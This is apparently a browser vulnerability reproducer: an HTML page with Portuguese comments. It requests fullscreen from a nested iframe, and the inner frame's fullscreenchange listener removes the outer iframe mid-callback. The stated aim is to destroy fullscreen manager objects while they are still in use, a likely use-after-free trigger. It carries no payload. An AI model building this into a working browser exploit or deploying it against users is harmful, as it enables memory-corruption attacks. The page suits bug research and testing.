<html>
<body>
<button id="run">Run V2.4</button>
<div id="status">Ready</div>
<iframe id="testFrame" width="200" height="200"></iframe>
<script>
/*
  V2.4: Iframe dentro do iframe. Fullscreen pedido pelo NETO.
  Callback no NETO faz remove() do AVÔ — destrói dois níveis
  de FullscreenManager simultaneamente enquanto o do neto
  ainda está na call stack.
*/
var outerFrame = document.getElementById("testFrame");
var popup      = null;
var innerReady = false;

outerFrame.onload = function() {
    var outerDoc = outerFrame.contentDocument;
    if (!outerDoc || !outerDoc.body) return;
    if (innerReady) return;

    outerDoc.open();
    outerDoc.write(
        '<!DOCTYPE html><html><body>' +
        '<iframe id="inner" width="150" height="150"></iframe>' +
        '</body></html>'
    );
    outerDoc.close();

    var innerFrame = outerDoc.getElementById("inner");

    innerFrame.onload = function() {
        var innerDoc = innerFrame.contentDocument;
        if (!innerDoc || !innerDoc.body) return;

        innerDoc.open();
        innerDoc.write(
            '<!DOCTYPE html><html><body>' +
            '<div style="width:150px;height:150px;background:red"></div>' +
            '</body></html>'
        );
        innerDoc.close();

        innerReady = true;

        // Listener no NETO — remove o AVÔ
        innerDoc.addEventListener('webkitfullscreenchange', function() {
            document.getElementById("status").innerHTML =
                "INNER fullscreenchange — remove avô";

            // Remove dois níveis de Document de uma vez
            if (outerFrame && outerFrame.parentNode) outerFrame.remove();
            if (popup && !popup.closed) popup.close();
        });
    };
};

document.getElementById("run").onclick = function() {
    if (!innerReady) {
        document.getElementById("status").innerHTML = "aguarde iframe carregar";
        return;
    }

    popup = window.open("", "_blank", "width=400,height=300");
    popup.document.open();
    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
    popup.document.close();

    // Fullscreen pedido pelo NETO
    var innerDoc = outerFrame.contentDocument
                             .getElementById("inner")
                             .contentDocument;
    innerDoc.documentElement.webkitRequestFullscreen();

    setTimeout(function() {
        if (!popup || popup.closed) return;
        popup.focus();
        window.focus();
        try { outerFrame.contentWindow.focus(); } catch(e) {}

        setTimeout(function() {
            if (popup && !popup.closed) popup.close();
        }, 300);
    }, 300);
};
</script>
</body>
</html>
